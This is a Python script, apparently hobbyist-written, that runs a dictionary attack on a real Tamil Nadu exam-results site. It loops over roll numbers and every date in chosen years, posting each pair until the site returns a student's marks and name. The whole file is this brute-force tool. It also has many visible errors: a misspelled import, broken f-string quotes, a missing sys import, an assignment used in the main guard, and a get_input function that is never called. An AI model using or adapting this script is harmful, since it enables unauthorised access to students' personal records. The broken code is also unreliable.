from requests import post 
from bs4 import BeautifulSoup 
from datetime import datatime,timedelta
from sys import argv

def process_package(package):
    size = str(len(package.content)/1008)[0:4] + 'kb'
    status = package.status_code
    content = BeautifulSoup(package.text, 'html.parser').find('div',{'data-role' : 'content'}).text
    name = str( ' ' + content.splitlines()[6] +') ')
    
    if 50>= len(content):
        return { 'valid': False, 'content': content, 'size': size, 'status': status, 'name': name}
    else:
        return { 'valid': True, 'content': content, 'size': size, 'status': status, 'name': name}

def result_screen(Details : dict):
    
    if Details['valid']:    validation = 'valid'
    else:   validation = 'invalid'
    
    print(f'-----' *100)
    print(f'[req] :  {Details['id']} | {Details['date_of_brith]}  ({Details['number_of_id']}/{Details['number_of_dates]}) @!{Details['status']}  ^ ({Details['size']}kb)')
    print(f'     ')
    print(f'>>> Name          : ', Details['name'])
    print(f'>>> Student       : ', Details['id'])
    print(f'>>> DOB           : ', Details['date_of_brith'])
    print(f'>>> validation    : ', validation)
    print(f'>>> Total_count   : ', Details['total_count'])
    print(f'-----' *100)

def connection_send_package(roll_no, date_of_brith):
    url = 'https://tnresults.nic.in/wrfexrcd.asp' # CHECK URLPATH TO CORRECT SITE AATTACK
    header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, image/avif, image/webp,image/apng,*/*;q=0.8,application/signed-exchange; v=b3;q=0.7' ,
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-IN, en-GB;q=0.9,en-US;q=0.8,en;q=0.7' ,
    'Cache-Control': 'max-age=0' ,
    'Connection': 'keep-alive',
    'Content-Length': '45',
    'Content-Type':'application/x-www-form-urlencoded',
    'Cookie': 'ASPSESSIONIDCQABDARQ-GAAMKBBBEHJNBIKLKOCKENHL' ,
    'Host': 'tnresults.nic.in',
    'Origin': 'https://tnresults.nic.in',
    'Referer': 'https://tnresults.nic.in/wpcsxtd.htm',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36sec-ch-ua: "Not-A. Brand";v="99", "Chromium"; v="124" ' ,
    'sec-ch-ua-mobile':'?1',
    'sec-ch-ua-platform':'"Android" '}
    
    payload = {'regno':roll_no, 'dob': date_of_brith, 'B1':'Get Marks'}
    responce = post(url, headers=header, data=payload)
    return responce
    
def open_datasheet(path):
    with open(path,'r') as file:
        data=[]
        lines = file.readlines()
        for line in lines:  data.append(line.replace('\n',''))
        return data
        
def leaf_year(year):

    if year%400 == 0:   leap = True
    elif year%100 == 0: leap = False
    elif year%4 == 0:   leap = True
    else:   leap = False
    return leap
    
def render_day(year):    
    date = datetime.strptime(f"01/01/{year}","%d/%m/%Y")
    data = [f"{year}-01-01"]
    
    if leaf_year(year): #spcieal for leap year guys
            for d in range(365):
                date += timedelta(days=1)
                data.append(str(date)[0:10])
    else:
            for d in range(365):
                date += timedelta(days=1)
                data.append(str(date)[0:10])
    return data


def modify(day):
    ds= day.split("-")
    return str(f"{ds[2]}/{ds[1]}/{ds[0]}")
        
def dob_input_manager(text):
	if '/' in text: return text.split(',')
	else:
	     years = text.split(',')
	     dates, data = [], []
	     
	     if  str(years[0][-4:]) == '.txt':  return open_datasheet(str(years[0]))
	     
	     elif len(years[0]) ==10:
	         for year in years: dates.append(year)
	         return dates
	     else:
	         for year in years:
	                for date in render_day(year):   data.append(date)
	         for day in data:   dates.append(modify(day))
	         return dates

def register_no_input_manager(text):

    info = text.split(",")
    data=[]
    
    if str(info[0][-4:]) == '.txt':
        return open_datasheet(str(info[0]))     
    else:
        for id in info:
            data.append(id)
        return data
    
def students_dictionary_attack( collaction_of_roll_no, collaction_of_date_of_brith):
    
    total_number_of_Id = 0
    total_count_of_squence_over_student  = 0 
    number_of_dates = 0
    
    for studentID in collaction_of_roll_no:
        total_number_of_Id += 1
        number_of_dates = len( collaction_of_date_of_brith)
        
        for date_of_brith in collaction_of_date_of_brith:
            number_of_dates -= 1
            total_count_of_squence_over_student += 1
            
            package = connection_send_package( studentID, date_of_brith)
            result = process_package(package)
            
            Details = result.copy().update({'id': studentID, 'date_of_brith':date_of_brith, 'total_count': total_count_of_squence_over_student, 'number_of_dates':number_of_dates, 'number_of_id': total_number_of_Id})
            result_screen(Details)
            
            if Details['valid']:    break
            
def get_input():
    roll_no, date_of_brith=0,0
    
    if  len(sys.argv) >= 2:
        roll_no = register_no_input_manager(argv[1])
        date_of_brith = dob_input_manager(argv[2])
    
    else:
        roll_no = register_no_input_manager(input("Regno -> "))
        date_of_brith = dob_input_manager(input("Dob  -> "))
        
    return roll_no, date_of_brith
    
if __name__ = '__main__':

    print('-----' *100)
    print('welcome')
    print('-----' *100, '\n')
    
    input = get_input
    students_dictionary_attack(input)
